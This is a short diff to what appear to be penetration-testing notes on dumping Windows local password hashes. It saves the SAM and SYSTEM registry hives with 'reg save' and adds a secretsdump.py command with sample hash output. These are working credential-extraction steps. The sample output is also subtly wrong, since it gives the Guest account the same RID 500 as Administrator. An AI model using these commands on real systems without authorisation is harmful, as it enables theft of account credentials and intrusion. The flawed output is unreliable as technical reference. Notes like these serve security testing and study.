@@ -46,5 +46,8 @@ It can be copied through Shadow or Registry Copy
 SAM file is encrypted by default
 reg save HKLM\SAM ./SAM
 reg save HKLM\SYSTEM ./SYSTEM
+secretsdump.py -sam <SAM_Name> -system <SYSTEM_Name> -hashes lmhash:nthash LOCAL -outputfile <filename>
+  Administrator:500:<LM_HASH>:<NTLM_HASH>:::
+  Guest:500:<LM_HASH>:<NTLM_HASH>:::
 
 
